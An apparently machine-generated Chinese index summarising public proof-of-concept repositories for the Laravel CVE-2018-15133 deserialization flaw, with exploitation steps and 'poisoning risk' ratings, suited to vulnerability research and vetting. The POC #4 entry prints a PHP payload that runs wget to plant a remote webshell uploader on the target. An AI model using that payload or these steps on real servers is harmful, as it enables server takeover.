# CVE-2018-15133

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-15133-0xSalle_cve-2018-15133.md](../2018/CVE-2018-15133-0xSalle_cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行和服务器被完全控制

**影响版本:** 5.5.40 及之前版本，5.6.x 版本直至 5.6.29

**利用条件:** 需要知道 Laravel 应用的 APP_KEY，通常情况下无法获取，但如果攻击者之前拥有过特权访问权限或成功完成了之前的攻击，则可能获取到。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，攻击者可以通过在 X-XSRF-TOKEN 值上进行未授权的反序列化操作，导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 的 gadgetchains/Laravel/RCE/3/chain.php 中。利用该漏洞需要知道 Laravel 应用的 APP_KEY，并通过精心构造的序列化数据，触发特定的 PHP 对象链（gadget chain）执行任意代码。

**有效性：**
提供的 POC 代码看起来是有效的，因为它实现了以下功能：
1.  生成恶意 payload：根据指定的命令、API 密钥和 payload 方法，生成反序列化 payload。
2.  加密 payload：使用 Laravel 应用的 APP_KEY 对 payload 进行 AES 加密，并生成相应的 IV 和 MAC 值。
3.  发送 payload：将加密后的 payload 设置到 X-XSRF-TOKEN cookie 中，并发送请求到 Laravel 应用。

**投毒风险：**
该代码仓库中存在一定的投毒风险，大约为10%。风险主要体现在以下几个方面：
1.  **潜在的后门代码：** 即使表面上代码实现了漏洞利用的功能，但攻击者可能在代码中隐藏一些恶意的后门，例如：
    *   在生成 payload 的过程中，插入额外的恶意代码。
    *   在请求发送过程中，记录或泄露敏感信息。
    *   利用漏洞在目标服务器上部署持久化后门。
2.  **依赖风险：** 该 POC 代码可能依赖于一些外部库或模块，这些库或模块本身可能存在安全漏洞或恶意代码。
3.  **不完善的错误处理：** 代码中的错误处理可能不够完善，导致程序在特定情况下崩溃或产生其他安全问题。

**利用方式：**
利用方式如下：
1.  **获取 APP_KEY：** 首先需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步，可能需要通过其他漏洞或社会工程学手段获取。
2.  **生成 Payload：** 使用 POC 代码生成包含恶意命令的 payload。POC 允许选择不同的 payload 方法（Laravel RCE1, RCE2, RCE3, RCE4），选择合适的 payload 方法可能取决于目标环境的配置。
3.  **加密 Payload：** 使用 APP_KEY 对生成的 payload 进行加密，并计算 MAC 值。
4.  **发送请求：** 将加密后的 payload 作为 X-XSRF-TOKEN cookie 的值发送到目标 Laravel 应用。
5.  **触发反序列化：** Laravel 应用在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 的值，从而触发漏洞，执行恶意代码。

**项目地址:** [0xSalle/cve-2018-15133](https://github.com/0xSalle/cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #2

**来源**: [CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md](../2018/CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行，完全控制服务器

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，可以通过其他漏洞获取或之前已获得特权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 5.5.40 及之前版本，以及 5.6.x 系列的 5.6.29 及之前版本中。攻击者可以通过在 X-XSRF-TOKEN 中发送恶意序列化数据，利用 `unserialize` 函数执行任意代码。利用链涉及 `Illuminate/Encryption/Encrypter.php` 的 decrypt 方法以及 phpggc 中的 `PendingBroadcast` gadget chain。攻击的先决条件是攻击者需要知道 Laravel 应用的 `APP_KEY`，这通常很难，但可以通过信息泄露漏洞或其他攻击获得。提供的 PoC 代码包含一个 bash 脚本 `betterpoc.sh` 用于自动化利用，以及一个 PHP 脚本 `cve-2018-15133.php` 用于生成恶意 X-XSRF-TOKEN。`betterpoc.sh` 脚本通过调用 `phpggc` 生成反序列化 payload，然后使用 `cve-2018-15133.php` 脚本利用 APP_KEY 加密 payload，最终通过 curl 发送包含恶意 token 的 POST 请求。投毒风险分析：尽管 PoC 代码主要用于漏洞验证，自动化脚本存在轻微风险，例如通过修改命令注入后门，该风险较低，约10%，因需要使用者进行配置，且代码清晰可见。利用方式总结：1. 获取目标 Laravel 应用的 APP_KEY。2. 使用 phpggc 生成执行任意命令的反序列化 payload。3. 使用 cve-2018-15133.php 脚本，利用 APP_KEY 加密 payload 生成 X-XSRF-TOKEN。4. 发送包含恶意 X-XSRF-TOKEN 的 POST 请求到目标服务器。

**项目地址:** [AlienX2001/better-poc-for-CVE-2018-15133](https://github.com/AlienX2001/better-poc-for-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #3

**来源**: [CVE-2018-15133-AzhariKun_CVE-2018-15133.md](../2018/CVE-2018-15133-AzhariKun_CVE-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，并且目标存在未升级的Laravel框架漏洞版本。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞，攻击者通过在X-XSRF-TOKEN中注入恶意序列化数据，并利用`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法进行解密时触发反序列化操作，从而执行任意代码。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码利用了该漏洞，通过上传包含恶意payload的XSRF-TOKEN，理论上是有效的。该代码首先尝试从`.env`文件中获取`APP_KEY`，然后将目标站点和`APP_KEY`发送到 `http://exploit.anons79.com/`，进行后续处理。GitHub上也有公开的利用代码，可以辅助验证漏洞。

**投毒风险：**
POC 代码存在一定的投毒风险。

1.  **依赖外部网站**：POC 代码向 `http://exploit.anons79.com/` 发送数据。如果这个网站被攻陷或者被作者控制，可能被植入恶意代码。所以具有一定的风险。
2.  **未知的恶意行为**：`http://exploit.anons79.com/` 站点的行为是不透明的。虽然POC声称是自动上传shell,但实际实现可能包含未知的恶意行为，例如：收集目标信息，植入更深层次的后门。
3.  **`.env` 文件泄露**:  直接尝试从 `.env` 文件中读取 `APP_KEY` 存在风险，可能导致敏感信息泄露。

综合来看，投毒风险大概在20%左右。

**利用方式：**
1.  **获取APP_KEY：** 攻击者首先需要获取Laravel应用的APP_KEY。这可以通过多种方式实现，例如：
    *   直接读取.env文件（如果配置不当允许访问）。
    *   通过其他漏洞（如文件包含、SQL注入等）获取。
    *   猜测或者暴力破解（难度较高）。
2.  **构造恶意payload：** 攻击者使用phpggc等工具，根据已知的gadget chain构造恶意的序列化payload。
3.  **加密payload：** 使用APP_KEY和Laravel的加密算法对payload进行加密。
4.  **发送请求：** 将加密后的payload作为X-XSRF-TOKEN的值，发送到目标Laravel应用。
5.  **触发反序列化：** 当Laravel应用处理请求时，会解密X-XSRF-TOKEN，从而触发反序列化操作，最终执行payload中的恶意代码，实现远程代码执行。

**项目地址:** [AzhariKun/CVE-2018-15133](https://github.com/AzhariKun/CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #4

**来源**: [CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用程序密钥（APP_KEY），并且目标系统存在脆弱的Laravel版本。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 框架中，由于对 X-XSRF-TOKEN 值的反序列化操作不当导致远程代码执行。具体来说，`Illuminate/Encryption/Encrypter.php` 中的 `decrypt` 方法和 `phpggc` 中的 `gadgetchains/Laravel/RCE/3/chain.php` 存在问题。攻击者需要知道应用程序的 APP_KEY 才能利用此漏洞，通常情况下这是不可能的，除非攻击者之前已经获得了特权访问权限或成功完成了之前的攻击。

**有效性评估：**
根据漏洞信息、搜索结果和漏洞利用代码，该漏洞的PoC代码**可能有效**。github上的确存在相关的exp仓库（例如：aljavier/exploit_laravel_cve-2018-15133 和 kozmic/laravel-poc-CVE-2018-15133）。漏洞利用需要已知APP_KEY。

**投毒风险分析：**
提供的PoC代码 `cve.py` 的主要功能是生成包含恶意 URL 的 `curl` 命令，并将其写入 `nikmok.txt` 文件。该 URL 包含一个路径 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`，并在GET请求中包含一段PHP代码，尝试使用`passthru`函数执行`wget`命令，从github下载 `vspup.php` 并保存为 `lol.php`。这种行为本身就具有风险，因为攻击者可能会控制下载的 `lol.php` 内容，从而执行任意代码。

`README.md` 文件指示用户执行 `nikmok.txt` 文件，该文件包含之前生成的 `curl` 命令，实际上是执行远程文件下载和执行的命令。`/vendor/phpunit/phpunit/src/Util/PHP/lol.php` 文件的路径则指示尝试访问利用`vspup.php`下载的lol.php文件，但是这个路径并不合理，因为vspup.php已经被下载到根目录并命名为lol.php。因此，该EXP存在一些问题，**投毒风险较低,大约为10%**，主要集中在github仓库作者可能在其他文件中包含恶意代码或在vspup.php中植入后门（虽然这个不是这个仓库作者控制的）。

**利用方式：**

1.  **前提条件：** 获取目标 Laravel 应用的 APP_KEY。
2.  **构造恶意 X-XSRF-TOKEN：** 使用 `phpggc` 工具生成包含恶意 payload 的序列化数据。该 payload 利用 Laravel 的反序列化漏洞，可以执行任意代码。
3.  **加密 X-XSRF-TOKEN：** 使用 APP_KEY 对 payload 进行加密，生成有效的 X-XSRF-TOKEN。
4.  **发送请求：** 将加密后的 X-XSRF-TOKEN 作为 Cookie 或 Header 发送到目标 Laravel 应用。
5.  **触发漏洞：** 当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，恶意 payload 将被执行，从而实现远程代码执行。
6.  **简化流程(根据提供的POC代码)：**
    a. 运行`cve.py`脚本，输入目标网址。
    b. 脚本会将包含特定路径和参数的curl命令写入`nikmok.txt`，尝试通过GET请求和数据`<?php echo passthru("wget https://raw.githubusercontent.com/sKirua/Vespa-Uploader/master/vspup.php -O lol.php");?>`来下载文件。
    c. 运行`nikmok.txt`（实际上是运行文件内包含的curl命令）。
    d. 目标网站如果存在对应路径，则会尝试下载并执行githubusercontent中的`vspup.php`文件，该文件会被重命名为`lol.php`。
    e.  最终的利用需要攻击者能访问到通过`vspup.php`下载的lol.php文件，在提供的路径`/vendor/phpunit/phpunit/src/Util/PHP/lol.php`中，尝试执行恶意代码。

**项目地址:** [Bilelxdz/Laravel-CVE-2018-15133](https://github.com/Bilelxdz/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #5

**来源**: [CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md](../2018/CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中，是由于对 X-XSRF-TOKEN 值进行 unserialize 调用时，可能导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 中的 gadgetchains/Laravel/RCE/3/chain.php 中。攻击者必须知道应用程序密钥（APP_KEY），通常这是不可能发生的，除非攻击者先前拥有特权访问权限或成功完成了之前的攻击。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步。
2.  攻击者使用 phpggc (或类似工具) 生成一个恶意的 PHP 对象序列化字符串，该字符串利用了 Laravel 框架中的反序列化漏洞链（例如，PendingBroadcast 和相关的 gadget chain）。
3.  该序列化字符串被加密并编码，然后设置为 X-XSRF-TOKEN cookie 的值。
4.  当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN cookie 时，恶意的对象链会被触发，导致远程代码执行。

**POC有效性：**

提供的 POC 代码利用了 CVE-2018-15133 漏洞。代码中包含了生成加密数据，设置 X-XSRF-TOKEN cookie，以及发送请求的代码。给定的命令可以通过反序列化执行。

**投毒风险：**

查看`exploit.go`后，发现代码的主要功能是生成恶意序列化数据，加密数据，以及发送HTTP请求。该`exploit.go`文件代码量较少,功能明确,没有发现明显的恶意代码。
README.md 文档描述了漏洞利用的步骤和所需的环境。其中提到需要下载并运行 Docker 镜像 `kozmico/laravel-poc-cve-2018-15133`。 虽然该 Docker 镜像本身不是本次评估的一部分，但是如果该镜像中包含恶意代码，则可能会导致投毒攻击。该镜像的安全性需要单独评估。此外，该README建议使用 kali linux 虚拟机进行攻击。说明攻击环境搭建比较复杂。总的来说，此仓库存在一定的投毒风险，但主要风险来源于引用的 Docker 镜像，而非提供的Go代码。根据评估，代码本身存在投毒的概率较低，大约在10%。

**项目地址:** [Cr4zyD14m0nd137/Lab-for-cve-2018-15133](https://github.com/Cr4zyD14m0nd137/Lab-for-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #6

**来源**: [CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md](../2018/CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md)

## CVE-2018-15133-Laravel框架-反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，通过X-XSRF-TOKEN传递恶意payload。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133漏洞存在于Laravel Framework的5.5.40及之前版本，以及5.6.x到5.6.29版本。该漏洞是由于对X-XSRF-TOKEN值进行unserialize调用时，未对数据进行充分验证，导致远程代码执行。攻击者需要知道APP_KEY才能成功利用此漏洞。这个APP_KEY通常不会被泄露，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能发生。

**漏洞利用方式：**

1.  攻击者获取Laravel应用的APP_KEY（例如，通过源代码泄露、环境变量泄露等）。
2.  攻击者使用phpggc生成包含恶意代码的PHP序列化payload。POC中使用了`Laravel/RCE5` gadget chain，该gadget chain允许执行任意系统命令。
3.  攻击者使用APP_KEY加密该payload，并将其设置为X-XSRF-TOKEN cookie的值。
4.  攻击者向目标Laravel应用发送包含该cookie的HTTP请求。
5.  Laravel应用解密cookie值，然后反序列化payload，执行恶意代码。

**漏洞利用有效性：**

提供的PoC代码是有效的，因为它实现了上述漏洞利用过程。该脚本使用phpggc生成payload，然后使用APP_KEY对其进行加密，并发送包含该加密payload的HTTP请求。

**投毒风险：**

该代码的投毒风险极低。原因如下：

*   代码量较少，逻辑清晰，主要功能是利用已知的反序列化漏洞。
*   代码使用了subprocess调用外部程序phpggc，如果phpggc本身被篡改，则可能引入风险，但该风险不在本代码的范围内。
*   代码中没有发现任何尝试连接外部服务器或执行其他恶意操作的迹象。
*  由于脚本依赖phpggc来生成payload, 因此如果phpggc被替换成了恶意版本,可能会存在被投毒的风险. 但本脚本本身只是对phpggc的调用,不具备投毒的特性. 如果不考虑第三方依赖的风险, 代码投毒风险评估为1%.

**项目地址:** [Loaxert/CVE-2018-15133-PoC](https://github.com/Loaxert/CVE-2018-15133-PoC)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #7

**来源**: [CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md](../2018/CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md)

## CVE-2018-15133-Laravel-反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道 Laravel 应用的 application key

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 是 Laravel 框架中的一个反序列化漏洞，存在于 5.5.40 及之前的版本，以及 5.6.x 系列的 5.6.29 及之前的版本。该漏洞源于对 X-XSRF-TOKEN 值的不可信反序列化调用，攻击者可以通过构造恶意的序列化数据，并将其作为 X-XSRF-TOKEN 的值发送到服务器，从而触发远程代码执行。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 application key。这通常是利用此漏洞最困难的部分。攻击者可能通过先前获取的权限或信息泄露来获得此密钥。
2.  攻击者使用 phpggc 等工具，基于 PendingBroadcast gadget chain 生成恶意的序列化 payload。
3.  攻击者使用 application key 对 payload 进行加密，并生成相应的 X-XSRF-TOKEN 值。
4.  攻击者将构造的 X-XSRF-TOKEN 值添加到 HTTP 请求头中，并发送到目标 Laravel 应用。
5.  服务器在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 值，从而触发 payload 中的恶意代码，最终实现远程代码执行。

**有效性：**

根据漏洞信息、搜索结果和提供的 POC 代码，可以判断该漏洞利用是有效的。搜索结果中提供了多个关于此漏洞的描述和利用的链接，包括 NVD、CISA 的已知被利用漏洞目录以及 GitHub 上的 POC 代码仓库。

提供的 POC 代码 (main.cpp) 看起来是一个 C++ 编写的漏洞利用程序，它实现了以下功能：

*   接受 URL、命令和 application key 作为参数。
*   生成恶意的 X-XSRF-TOKEN 值。
*   发送带有构造的 X-XSRF-TOKEN 值的 HTTP 请求到目标 URL。

该 POC 代码使用了 OpenSSL 库进行 AES 加密和 HMAC 计算，并且使用了 Base64 编码。  代码逻辑与漏洞描述一致，即利用已知的 application key，构造恶意payload，经过加密、编码后，作为 X-XSRF-TOKEN 发送，从而触发反序列化漏洞。

**投毒风险：**

该 POC 代码主要由 `main.cpp` 和 `build.sh` 构成。`build.sh` 负责编译 `main.cpp`。`main.cpp` 代码量相对较大，人工review 存在疏漏的可能。以下是我对投毒风险的分析：

*   **正面因素：** 代码逻辑主要集中在实现漏洞利用上，包括参数解析、payload 生成、加密、编码、HTTP 请求发送等。没有发现明显的恶意代码或后门。
*   **负面因素：**  代码使用了第三方库 OpenSSL，并且包含一些字符串处理和内存管理操作，这些地方可能存在安全漏洞。例如，如果代码没有正确处理字符串长度，可能会导致缓冲区溢出。
*   **潜在风险：** 攻击者可能通过修改 `build.sh` 添加额外的编译选项，例如链接恶意库，从而植入后门。但是，提供的 `build.sh` 文件比较简单，只包含编译命令，没有发现任何可疑操作。

综合来看，该仓库中存在作者隐藏的投毒代码的可能性较低，大概在5%左右。主要风险在于代码中可能存在的潜在安全漏洞，以及编译过程中可能被利用的风险。

**项目地址:** [NatteeSetobol/CVE-2018-15133-Lavel-Expliot](https://github.com/NatteeSetobol/CVE-2018-15133-Lavel-Expliot)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #8

**来源**: [CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md](../2018/CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 5.5.x <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，通过 X-XSRF-TOKEN 传递恶意序列化数据。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-15133 漏洞是 Laravel 框架中由于对 X-XSRF-TOKEN 值的反序列化操作不当导致的远程代码执行漏洞。攻击者可以构造恶意的序列化数据，通过 X-XSRF-TOKEN 头部发送给服务器，服务器在解密和反序列化该数据时，执行攻击者预先设定的恶意代码。漏洞利用的关键在于需要知道 Laravel 应用的 APP_KEY，才能成功加密和构造恶意数据。搜索结果表明该漏洞已被CISA列入已知被利用的漏洞目录。

提供的漏洞利用代码 `rce.sh` 通过访问 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` 接口，利用该接口执行PHP代码的特性，尝试上传一个PHP Webshell（uploader.php）。虽然脚本本身的功能是上传webshell，但脚本并不会主动植入恶意后门,所以判定投毒风险为0%。 脚本的原理是利用 phpunit 的 eval-stdin.php 文件, 该文件可以执行POST请求中的PHP代码, 从而进行webshell上传。 这种利用方式依赖于目标环境存在phpunit且eval-stdin.php文件存在且可访问。

**项目地址:** [Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader](https://github.com/Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #9

**来源**: [CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md](../2018/CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 and 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，这通常需要事先获得了特权访问权限或成功实施了先前的攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞。攻击者可以利用此漏洞，通过在X-XSRF-TOKEN中注入恶意序列化数据，实现在目标服务器上执行任意代码。漏洞利用的核心在于`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法和`phpggc`中的`gadgetchains/Laravel/RCE/3/chain.php`。

**有效性：**

从漏洞描述和搜索结果来看，此漏洞已经被CISA列入已知被利用的漏洞目录，表明该漏洞在野外被积极利用。提供的PoC代码基于已知的利用方式，并参考了 Metasploit 的 exploit，所以该PoC代码有效。

**投毒风险：**

PoC代码主要由两个文件组成：`README.md` 和 `pwn_laravel.py`。

*   `README.md`: 包含漏洞描述、利用方法、依赖安装和免责声明等信息。没有发现恶意代码。
*   `pwn_laravel.py`: PoC利用脚本，用于生成恶意payload并发送到目标服务器。脚本利用了`Crypto`库进行加密和解密操作。虽然代码功能是实现RCE，但本身逻辑并没有发现明显的投毒行为。

分析后认为，投毒风险主要存在于依赖项上，尤其是`Crypto`库。但是由于该库比较常用，如果存在恶意代码，可能会被更早发现。

根据代码的功能和依赖关系，判定投毒风险为10%。

**利用方式：**

1.  **获取APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要获取目标Laravel应用的APP_KEY。APP_KEY通常存储在`.env`文件中。
2.  **生成恶意Payload：** 使用PoC脚本`pwn_laravel.py`，指定目标URL、APP_KEY和要执行的命令，生成恶意的序列化数据，并使用APP_KEY对其进行加密。
3.  **发送请求：** 将生成的加密数据作为`X-XSRF-TOKEN`的值，通过HTTP请求发送到目标Laravel应用。
4.  **触发反序列化：** Laravel应用在处理请求时，会尝试解密`X-XSRF-TOKEN`，并对其进行反序列化。如果APP_KEY正确，且反序列化链存在，则会导致远程代码执行。

总而言之，该漏洞的利用依赖于APP_KEY的泄露，攻击难度较高，但危害性很大。

**项目地址:** [aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #10

**来源**: [CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md](../2018/CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常不易获取，除非之前已获得权限或成功进行过其他攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中。由于对 X-XSRF-TOKEN 值进行不可信的反序列化调用，可能导致远程代码执行。涉及到 Illuminate/Encryption/Encrypter.php 中的 decrypt 方法和 phpggc 中 gadgetchains/Laravel/RCE/3/chain.php 。攻击者必须知道应用程序密钥（APP_KEY），这通常不会发生，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能会发生。

**利用方式：**

1.  **获取 APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要设法获取 Laravel 应用的 APP_KEY，这可能通过源代码泄露、数据库访问或其他漏洞实现。
2.  **构造恶意 XSRF-TOKEN：** 使用 phpggc 工具生成包含恶意 PHP 对象的序列化字符串。该对象旨在利用 Laravel 框架中的反序列化漏洞执行任意代码。
3.  **加密 Payload：**  使用 APP_KEY 对序列化的 Payload 进行加密，生成有效的 XSRF-TOKEN。代码中的`cve.php`脚本完成了这个步骤，使用APP_KEY对phpggc生成的Payload加密，然后放入Cookie中。
4.  **发送包含恶意 XSRF-TOKEN 的请求：**  将构造的 XSRF-TOKEN 设置为 Cookie，并发送到目标 Laravel 应用。
5.  **触发反序列化：**  当 Laravel 应用尝试解密并反序列化 XSRF-TOKEN 时，恶意对象将被实例化，从而执行攻击者指定的代码。

**POC有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，此POC有效。存在多个公开的漏洞利用代码，CISA也将此漏洞标记为已知被利用漏洞，增加了POC的有效性。

**投毒风险：**

虽然主利用脚本 `cve.php` 看起来是直接利用漏洞，但仍然存在一些潜在的投毒风险：

*   **依赖外部资源：** `cve.php` 依赖于 `phpggc` 工具，如果 `phpggc` 被篡改，可能会引入恶意代码。风险相对较低，因为 `phpggc` 是一个广泛使用的工具，被篡改的可能性较低。但是仍需确认。
*   **shell_exec函数滥用风险：** `cve.php` 中多次使用了 `shell_exec` 函数，包括执行 `phpggc` 命令和 `curl` 命令。如果攻击者可以控制这些命令的参数，就可能执行任意系统命令。由于 `cve.php` 需要用户提供 APP_KEY 和目标 URL，并且有 payload 参数，存在用户误用的情况，比如直接使用了恶意payload。
*   **README.md文件：**此文件是正常的说明文档，没有发现投毒内容。
*   **phpggc:** 本身作为一个payload生成器，其本身不应该作为投毒风险考虑，而是应该考虑其生成payload的安全性。

考虑到以上因素，评估此仓库的投毒风险为 10%。 风险主要集中在用户误用，或者`phpggc`工具被篡改的可能性。

**项目地址:** [bukitbarisan/laravel-rce-cve-2018-15133](https://github.com/bukitbarisan/laravel-rce-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #11

**来源**: [CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md](../2018/CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework Token Unserialize RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常需要之前已经获得的特权访问或成功利用了之前的漏洞。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133 漏洞是 Laravel Framework 中由于对 X-XSRF-TOKEN 值进行不安全的反序列化操作导致的远程代码执行漏洞。攻击者可以通过伪造恶意的 X-XSRF-TOKEN，并将其加密后发送给服务器，服务器在解密并反序列化该 token 时，会执行攻击者预先设定的恶意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞的 POC 代码是有效的。搜索引擎结果中包含了多个指向该漏洞的详细描述、利用代码示例以及缓解措施的文章，包括 CISA 将其添加到已知被利用的漏洞目录中。
提供的 Dockerfile 文件和 README.md 文件描述了如何搭建一个存在漏洞的 Laravel 环境并利用 `cve-2018-15133.php` 脚本进行攻击。README.md 中给出了详细的利用步骤，包括获取 APP_KEY，生成反序列化 Payload，加密 Payload，最后通过 POST 请求发送 Payload。脚本通过构造特定的 PHP 对象，在反序列化时触发 `system()` 函数来执行任意命令。

**投毒风险：**
Dockerfile文件用于构建一个包含漏洞版本的Laravel应用的Docker镜像。 cve-2018-15133.php 用于漏洞利用，并没有发现可疑或恶意行为，因此投毒风险较低。

